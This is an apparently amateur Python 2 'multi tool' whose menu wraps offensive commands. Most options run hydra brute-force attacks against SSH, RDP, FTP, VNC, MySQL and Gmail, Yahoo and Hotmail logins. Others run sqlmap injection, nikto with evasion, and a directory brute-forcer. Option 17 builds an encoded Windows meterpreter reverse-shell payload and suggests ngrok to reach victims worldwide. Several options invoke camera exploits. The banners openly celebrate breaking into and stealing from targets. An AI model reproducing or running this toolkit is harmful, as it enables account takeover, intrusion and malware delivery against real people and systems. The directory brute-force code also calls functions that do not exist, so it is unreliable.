#!/usr/bin/env python
import sys, os, time

##########Restart##############################
def restart_program():			      #
   python = sys.executable		      #
   os.execl(python, python, * sys.argv)       #
   curdir = os.getcwd()			      #
###############################################

os.system("clear")
print '''
          _____                    _____                    _____                    _____                    _____        _____                    _____          
         /\    \                  /\    \                  /\    \                  /\    \                  /\    \      /\    \                  /\    \         
        /::\    \                /::\    \                /::\____\                /::\____\                /::\____\    /::\    \                /::\    \        
       /::::\    \              /::::\    \              /::::|   |               /:::/    /               /:::/    /    \:::\    \               \:::\    \       
      /::::::\    \            /::::::\    \            /:::::|   |              /:::/    /               /:::/    /      \:::\    \               \:::\    \      
     /:::/\:::\    \          /:::/\:::\    \          /::::::|   |             /:::/    /               /:::/    /        \:::\    \               \:::\    \     
    /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |            /:::/    /               /:::/    /          \:::\    \               \:::\    \    
   /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |           /:::/    /               /:::/    /           /::::\    \              /::::\    \   
  /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______    /:::/    /      _____    /:::/    /           /::::::\    \    ____    /::::::\    \  
 /:::/\:::\   \:::\____\  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \  /:::/____/      /\    \  /:::/    /           /:::/\:::\    \  /\   \  /:::/\:::\    \ 
/:::/  \:::\   \:::|    |/:::/__\:::\   \:::\____\/:::/    |:::::::::\____\|:::|    /      /::\____\/:::/____/           /:::/  \:::\____\/::\   \/:::/  \:::\____\ 
\::/    \:::\  /:::|____|\:::\   \:::\   \::/    /\::/    / ~~~~~/:::/    /|:::|____\     /:::/    /\:::\    \          /:::/    \::/    /\:::\  /:::/    \::/    /
 \/_____/\:::\/:::/    /  \:::\   \:::\   \/____/  \/____/      /:::/    /  \:::\    \   /:::/    /  \:::\    \        /:::/    / \/____/  \:::\/:::/    / \/____/ 
          \::::::/    /    \:::\   \:::\    \                  /:::/    /    \:::\    \ /:::/    /    \:::\    \      /:::/    /            \::::::/    /          
           \::::/    /      \:::\   \:::\____\                /:::/    /      \:::\    /:::/    /      \:::\    \    /:::/    /              \::::/____/           
            \::/____/        \:::\   \::/    /               /:::/    /        \:::\__/:::/    /        \:::\    \   \::/    /                \:::\    \           
             ~~               \:::\   \/____/               /:::/    /          \::::::::/    /          \:::\    \   \/____/                  \:::\    \          
                               \:::\    \                  /:::/    /            \::::::/    /            \:::\    \                            \:::\    \         
                                \:::\____\                /:::/    /              \::::/    /              \:::\____\                            \:::\____\        
                                 \::/    /                \::/    /                \::/____/                \::/    /                             \::/    /        
                                  \/____/                  \/____/                  ~~                       \/____/                               \/____/         
_________________________________________________________________________________________________________________________________________________________________
						      c=={:::::::::::::::> Multi Tool--->made by me... CRYPTO
							               (}xxx{):::::::::> Private Eyes Cyber Team
              					     	          ===|[ Private Eyes Multi Tool ]|===


  [01] Cisco Brute Force					[21] CloudFail OIA - Online Intellegence Analysis
  [02] VNC Brute Force						[22] Netwave IP Camera - Password Disclosure
  [03] FTP Brute Force						[23] Avtech 0day Exploit - Proof of Concept
  [04] Gmail Brute Force					[24] Avtech 0day Exploit - Remote Code Execution
  [05] SSH Brute Force
  [06] TeamSpeak Brute Force
  [07] Telnet Brute Force
  [08] Yahoo Mail Brute Force
  [09] Hotmail Brute Force
  [10] Router Speedy Brute Force
  [11] RDP Brute Force
  [12] MySQL Brute Force
  [13] SQL Injection - Perimeter
  [14] Nmap Common Port Scanner
  [15] Nmap Range Port Scanner
  [16] Nmap OS Identifier - Aggressive Scan
  [17] MsfVenom Payload dropper
  [18] Nikto Web Vulnerability Scanner
  [19] Website Directory Buster
  [20] CloudFlare OIA - Online Intellegence Analysis

  [00] Exit

'''

pemulti = raw_input("[*] PE-Multi > ")

if pemulti == '01' or pemulti == '1':
  print
  print "   _____ _               ____             _       "
  print "  / ____(_)             |  _ \           | |      "
  print " | |     _ ___  ___ ___ | |_) |_ __ _   _| |_ ___ "
  print " | |    | / __|/ __/ _ \|  _ <| '__| | | | __/ _ \ "
  print " | |____| \__ | (_| (_) | |_) | |  | |_| | ||  __/"
  print "  \_____|_|___/\___\___/|____/|_|   \__,_|\__\___|"
  print "-=-=-=-=-=-=-=-=-Oooh nasty >:)-=-=-=-=-=-=-=-=-=-"
  print
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -P %s %s cisco" % (word, iphost))
  sys.exit()

elif pemulti == '02' or pemulti == '2':
  print
  print " __      ___   _  _____ ____             _       "
  print " \ \    / | \ | |/ ____|  _ \           | |      "
  print "  \ \  / /|  \| | |    | |_) |_ __ _   _| |_ ___ "
  print "   \ \/ / | . ` | |    |  _ <| '__| | | | __/ _ \ "
  print "    \  /  | |\  | |____| |_) | |  | |_| | ||  __/"
  print "     \/   |_| \_|\_____|____/|_|   \__,_|\__\___|"
  print "-=-=-=-=-=-=shit bruh get'em!!!=-=-=-=-=-=-=-=-=-"
  print
  word = raw_input("[*] Wordlist : ")
  iphost = raw_input("[*] IP/Hostname : ")
  os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
  iphost = raw_input("[*] IP/Hostname : ")

elif pemulti == '03' or pemulti == '3':
  print
  print "  ______ _______ _____  ____             _       "
  print " |  ____|__   __|  __ \|  _ \           | |      "
  print " | |__     | |  | |__) | |_) |_ __ _   _| |_ ___ "
  print " |  __|    | |  |  ___/|  _ <| '__| | | | __/ _ \ "
  print " | |       | |  | |    | |_) | |  | |_| | ||  __/"
  print " |_|       |_|  |_|    |____/|_|   \__,_|\__\___|"
  print "-=-=-this be some CIA shit right here=-=-=-=-=-=-"
  print
  user = raw_input("[*] User : ")
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
  sys.exit()

elif pemulti == '04' or pemulti == '4':
  print
  print "   _____                 _ _ ____             _       "
  print "  / ____|               (_) |  _ \           | |      "
  print " | |  __ _ __ ___   __ _ _| | |_) |_ __ _   _| |_ ___ "
  print " | | |_ | '_ ` _ \ / _` | | |  _ <| '__| | | | __/ _ \ "
  print " | |__| | | | | | | (_| | | | |_) | |  | |_| | ||  __/"
  print "  \_____|_| |_| |_|\__,_|_|_|____/|_|   \__,_|\__\___|"
  print "=-=-=-=-=-=Ohh you sneaky motherfucker XD=-=-=-=-=-=-="
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
  sys.exit()

elif pemulti == '05' or pemulti == '5':
   print
   print "   _____ _____ _    _ ____             _       "
   print "  / ____/ ____| |  | |  _ \           | |      "
   print " | (___| (___ | |__| | |_) |_ __ _   _| |_ ___ "
   print "   \___ \\___ \|  __  |  _ <| '__| | | | __/ _ \ "
   print "  ____) |___) | |  | | |_) | |  | |_| | ||  __/"
   print " |_____/_____/|_|  |_|____/|_|   \__,_|\__\___|"
   print " oof you got em hard bruh *thats what she said*"
   print
   user = raw_input("[*] User : ")
   word = raw_input("[*] Wordlist : ")
   iphost = raw_input("[*] IP/Hostname : ")
   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
   sys.exit()

elif pemulti == '06' or pemulti == '6':
        print
        print "   _______ _____                  _    ____             _       "
        print "   |__   __/ ____|                | |  |  _ \           | |     "
        print "      | | | (___  _ __   ___  __ _| | _| |_) |_ __ _   _| |_ ___"
        print "      | |  \___ \| '_ \ / _ \/ _` | |/ /  _ <| '__| | | | __/ _ \ "
        print "      | |  ____) | |_) |  __/ (_| |   <| |_) | |  | |_| | ||  __/"
        print "      |_| |_____/| .__/ \___|\__,_|_|\_\____/|_|   \__,_|\__\___|"
        print "                 | |                                             "
        print "                 |_|                                             "
	print "=-=-=-=-=-=-=-=-=damn real gaming right here-=-=-=-=-=-=-=-=-=-=-"
        print
        user = raw_input("[*] User : ")
        word = raw_input("[*] Wordlist : ")
        iphost = raw_input("[*] IP/Hostname : ")
        os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
        sys.exit()

elif pemulti == '07' or pemulti == '7':
        print
        print "  _______   _            _   ____             _       "
        print " |__   __| | |          | | |  _ \           | |      "
        print "    | | ___| |_ __   ___| |_| |_) |_ __ _   _| |_ ___ "
        print "    | |/ _ \ | '_ \ / _ \ __|  _ <| '__| | | | __/ _ \ "
        print "    | |  __/ | | | |  __/ |_| |_) | |  | |_| | ||  __/"
        print "    |_|\___|_|_| |_|\___|\__|____/|_|   \__,_|\__\___|"
	print "-=-=-=-=-=-=-=-=-=-=man you wild af-=-=-=-=-=-=-=-=-=-"
        print
        user = raw_input("[*] User : ")
        word = raw_input("[*] Wordlist : ")
        iphost = raw_input("[*] IP/Hostname : ")
        os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
        sys.exit()

elif pemulti == '08' or pemulti == '8':
  print
  print " __     __   _                 ____             _       "
  print " \ \   / /  | |               |  _ \           | |      "
  print "  \ \_/ /_ _| |__   ___   ___ | |_) |_ __ _   _| |_ ___ "
  print "   \   / _` | '_ \ / _ \ / _ \|  _ <| '__| | | | __/ _ \ "
  print "    | | (_| | | | | (_) | (_) | |_) | |  | |_| | ||  __/"
  print "    |_|\__,_|_| |_|\___/ \___/|____/|_|   \__,_|\__\___|"
  print "=-=-=-=-=-=-=-=-=-again sneaky ass-=-=-=-=-=-=-=-=-=-=-="
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
  sys.exit()

elif pemulti == '09' or pemulti == '9':
  print
  print "  _    _       _                   _ _ ____             _       "
  print " | |  | |     | |                 (_) |  _ \           | |      "
  print " | |__| | ___ | |_ _ __ ___   __ _ _| | |_) |_ __ _   _| |_ ___ "
  print " |  __  |/ _ \| __| '_ ` _ \ / _` | | |  _ <| '__| | | | __/ _ \ "
  print " | |  | | (_) | |_| | | | | | (_| | | | |_) | |  | |_| | ||  __/"
  print " |_|  |_|\___/ \__|_| |_| |_|\__,_|_|_|____/|_|   \__,_|\__\___|"
  print "-=-=-=-=-=-=-=-=-=-man you earn a reward-=-=-=-=-=-=-=-=-=-=-=-="
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
  sys.exit()

elif pemulti == '10':
        print
        print "  _____   _____ ____             _       "
        print " |  __ \ / ____|  _ \           | |      "
        print " | |__) | (___ | |_) |_ __ _   _| |_ ___ "
        print " |  _  / \___ \|  _ <| '__| | | | __/ _ \ "
        print " | | \ \ ____) | |_) | |  | |_| | ||  __/"
        print " |_|  \_\_____/|____/|_|   \__,_|\__\___|"
	print "-=-=-=-=-=-now that's evil-=-=-=-=-=-=-=-"
        print
        user = raw_input("[*] User : ")
        word = raw_input("[*] Wordlist : ")
        iphost = raw_input("[*] IP/Hostname : ")
        os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
        sys.exit()

elif pemulti == '11':
        print
        print "  _____  _____  _____  ____             _       "
        print " |  __ \|  __ \|  __ \|  _ \           | |      "
        print " | |__) | |  | | |__) | |_) |_ __ _   _| |_ ___ "
        print " |  _  /| |  | |  ___/|  _ <| '__| | | | __/ _ \ "
        print " | | \ \| |__| | |    | |_) | |  | |_| | ||  __/"
        print " |_|  \_\_____/|_|    |____/|_|   \__,_|\__\___|"
	print "<==(====>shit man are you mr.robot or something?"
        print
        user = raw_input("[*] User : ")
        word = raw_input("[*] Wordlist : ")
        iphost = raw_input("[*] IP/Hostname : ")
        os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
        sys.exit()

elif pemulti == '12':
        print
        print "                   _____  ____  _      ____             _       "
        print "                  / ____|/ __ \| |    |  _ \           | |      "
        print "  _ __ ___  _   _| (___ | |  | | |    | |_) |_ __ _   _| |_ ___ "
        print " | '_ ` _ \| | | |\___ \| |  | | |    |  _ <| '__| | | | __/ _ \ "
        print " | | | | | | |_| |____) | |__| | |____| |_) | |  | |_| | ||  __/"
        print " |_| |_| |_|\__, |_____/ \___\_\______|____/|_|   \__,_|\__\___|"
        print "             __/ |                                              "
        print "            |___/                                               "
	print "C===()+(::::::::::::::>steal as much porn as u can get!+=+=+=+=+"
        print
        user = raw_input("[*] User : ")
        word = raw_input("[*] Wordlist : ")
        os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
	sys.exit()
		
elif pemulti == '13':
	print
	print "   _____  ____  _      _____ "
	print "  / ____|/ __ \| |    |_   _|"
	print " | (___ | |  | | |      | |  "
	print "  \___ \| |  | | |      | |  "
	print "  ____) | |__| | |____ _| |_ "
	print " |_____/ \___\_\______|_____|"
	print "   		______               "
	print "SQL INJECTION |==______|---- *pew pew* thats for all the unvaccinated"
	print
	url = raw_input("[*] URL [example: http://hackme.org/details.php?id=1]: ")
	risk = raw_input("[*] Risk[FBI OPEN UP!!!] 1-3: ")
	level = raw_input("[*] Level 1-5: ")
	os.system("sqlmap -u %s --dbs --wizard --risk %s --level %s" % (url, risk, level))
	sys.exit()

elif pemulti == '14':
	print
	print "  _   _ __  __          _____     _____      _____        _____ "
	print " | \ | |  \/  |   /\   |  __ \   / ____|    |  __ \      / ____|"
	print " |  \| | \  / |  /  \  | |__) | | |   ______| |__) |____| (___  "
	print " | . ` | |\/| | / /\ \ |  ___/  | |  |______|  ___/______\___ \ "
	print " | |\  | |  | |/ ____ \| |      | |____     | |          ____) |"
	print " |_| \_|_|  |_/_/    \_\_|       \_____|    |_|         |_____/ "
	print "                                                                "
	print "             <--)(=======> Common Port Scanner"
	print
	IPorhost = raw_input("[*] IP-website-host: ")
	os.system("sudo nmap -vv -sV %s --open --reason" % (IPorhost))
	sys.exit()

elif pemulti == '15':
	print
	print "  _   _ __  __          _____    _____        _____        _____ "
	print " | \ | |  \/  |   /\   |  __ \  |  __ \      |  __ \      / ____|"
	print " |  \| | \  / |  /  \  | |__) | | |__) |_____| |__) |____| (___  "
	print " | . ` | |\/| | / /\ \ |  ___/  |  _  /______|  ___/______\___ \ "
	print " | |\  | |  | |/ ____ \| |      | | \ \      | |          ____) |"
	print " |_| \_|_|  |_/_/    \_\_|      |_|  \_\     |_|         |_____/ "
	print "                                                                 "
	print "                <-->|=======> Range Port Scanner                 "
	print
	IPTarget = raw_input("[*] IP-website-host: ")
	startport = raw_input("[*] start port: ")
	endport = raw_input("[*] end port: ")
	os.system("sudo nmap -vv %s -p%s-%s --open --reason" % (IPTarget, startport, endport))
	sys.exit()

elif pemulti == '16':
	print '''
	  _   _                        ____   _____ _____ 
	 | \ | |                      / __ \ / ____|_   _|
	 |  \| |_ __ ___   __ _ _ __ | |  | | (___   | |  
	 | . ` | '_ ` _ \ / _` | '_ \| |  | |\___ \  | |  
	 | |\  | | | | | | (_| | |_) | |__| |____) |_| |_ 
	 |_| \_|_| |_| |_|\__,_| .__/ \____/|_____/|_____|
	                       | |                        
	                       |_|                        
		    	Nmap OS Identifier
	'''
	TargetIP = raw_input("[*] IP-website-host: ")
	StealthScan = raw_input("[*] Stealthscan level [0-5 higher is faster]: ")
	os.system("sudo nmap -vv %s -A -O -T %s --open --reason" % (TargetIP, StealthScan))
	sys.exit()

elif pemulti == '17':
	print '''
	  __  __      ____      __                        
	 |  \/  |    / _\ \    / /                        
	 | \  / |___| |_ \ \  / /__ _ __   ___  _ __ ___  
	 | |\/| / __|  _| \ \/ / _ \ '_ \ / _ \| '_ ` _ \ 
	 | |  | \__ \ |    \  /  __/ | | | (_) | | | | | |
	 |_|  |_|___/_|     \/ \___|_| |_|\___/|_| |_| |_|
	        ____                            ____      
	     |>(____)     Shell Bomber!!!    |>(____)
	'''
	Encryptionlayer = raw_input("[*] encryption layer [ex: 25]: ")
	Localhost = raw_input("[*] LHOST [hint: if you want to use port forwarding use ngrok so you can hack people across the world!]: ")
	LocalPort = raw_input("[*] LPORT [default: 4444]: ")
	extention = raw_input("[*] extention [ex: exe]: ")
	FileName = raw_input("[*] Filename[ex: evilboi.exe]: ")
	os.system("sudo msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i %s LHOST=%s LPORT=%s -f %s > %s" % (Encryptionlayer, Localhost, LocalPort, extention, FileName))
	sys.exit()

elif pemulti == '18':
	print '''
	  _   _ _ _    _        
	 | \ | (_) |  | |       
	 |  \| |_| | _| |_ ___  
	 | . ` | | |/ / __/ _ \ 
	 | |\  | |   <| || (_) |
	 |_| \_|_|_|\_\\__\___/ 
	                        
	<web vulnerability scanner>'''

	websiteT = raw_input("[*] website: ")
	encoder = raw_input("[*] Evasion [1,2,3,4,5,6,7,8,A,B]: ")
	os.system("sudo nikto -h %s -e %s" % (websiteT, encoder))
	sys.exit()

elif pemulti == '19':
	print '''
	  _____  _      ____             _            
	 |  __ \(_)    |  _ \           | |           
	 | |  | |_ _ __| |_) |_ __ _   _| |_ ___ _ __ 
	 | |  | | | '__|  _ <| '__| | | | __/ _ \ '__|
	 | |__| | | |  | |_) | |  | |_| | ||  __/ |   
	 |_____/|_|_|  |____/|_|   \__,_|\__\___|_|   
	'''
	import urllib2
	import threading
	import Queue
	import urllib
	import sys

	def credit():
	    print "%sWebsite Dir Brute by yuh boi CRYPTO101%s" %(red,green)

	red	= 	"\033[01;31m"
	green = 	"\033[01;32m"
	yel =		"\033[01;33m"
	norm	=	"\033[0m" 
	credit()
	threads=50
	target_url=raw_input("website to fuck: ")
	wordlist_file=raw_input ("Directory wordlist: ")
	resume = None
	user_agent = "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"

	def make_wordlist(wordlist_file):
	    fb = open(wordlist_file,"rb")
	    raw_words=fb.readlines()
	    fb.close()
    
	    found_resume = False 
	    words = Queue.Queue()
	    for word in raw_words:
	        word=word.rstrip()
	        if resume is not None:
	            if found_resume:
	                words.put(word)
	            else :
	                if word == resume:
	                    found_resume=True
	                    print "Resume wordlist from [default: all.txt]: %s" % resume
	        else:
	            words.put(word)
	    return words
	def dir_brute(word_queue,extensions = None):
	    while not word_queue.empty():
	        attempt = word_queue.get()
	        attempt_list=[]
	        if "." not in attempt:
	            attempt_list.append("/%s/" % attempt)
	        else :
	            attempt_list.append("%s/" % attempt)
	        if extensions:
	            for extension in extensions:
	                attempt_list.append("/%s%s" %(attempt,extension))
	            for brute in attempt_list:
	                url="%s%s" % (target_url,urllib.quote(brute))
	                try :
	                    headers = {}
	                    headers["User-Agent"]= user_agent
	                    r=urllib2.Request(url, headers=headers)
	                    response = urllib2.urlopen(r)
	                    if len(response.read()):
	                        print "[%s%d%s] => %s"%(green,response.code,norm,url)
	                except urllib2.HTTPError, e:
	                    if hasattr(e,'code') and e.code != 404:
	                        
	                        pass
	                except urllib2.URLError:                     
	                    pass
	                except SocketError :
	                    pass
                
                
	if "http" not in target_url:
	    target_url = "http://"+target_url
	if target_url[-1] != "/":
	    target_url+="/"
	try:
	    f=open(wordlist_file,"r")
	    f.close()
	except IOError:
	    print "%sFile %s does not exist %s "%(red,wordlist_file,norm)
	    sys.exit()
                
                
	word_queue = build_wordlist(wordlist_file)
	extensions = [".php",".bak",".orig",".inc"]
	for i in range(threads):
	    try:
	        t = threading.Thread(target = dir_bruter, args=(word_queue,extensions,))
	        t.start()
	    except threading.ThreadError:
	        continue
    
                    
elif pemulti == '20':
	os.system("python Cloudscan.py")
	sys.exit()

elif pemulti == '21':
	CFurl = raw_input("[*] url[ex: pornhub.com]: ")
	os.system("python3 cloudfail.py --target %s" % (CFurl))
	sys.exit()

elif pemulti == '22':
	IPADDRESS = raw_input("[*] IP: ")
	PORTCAM = raw_input("[*] Port: ")
	os.system("python2 pownetwave.py %s:%s" % (IPADDRESS, PORTCAM))
	sys.exit()

elif pemulti == '23':
	AVTECH_IP = raw_input("[*] IP Address: ")
	AVTECH_PORT = raw_input("[*] Port: ")
	os.system("python AvtechPoC.py %s %s" % (AVTECH_IP, AVTECH_PORT))
	sys.exit()

elif pemulti == '00' or pemulti == '0':
        print "\n[!] Exit the Program... WEAKKK"
        sys.exit()

else:
        print "\n[!] ERROR : Wrong Input bro, ever heard of this thing called looking with your eyes? hah get it private eyes ;)"
        time.sleep(1)
        restart_program()

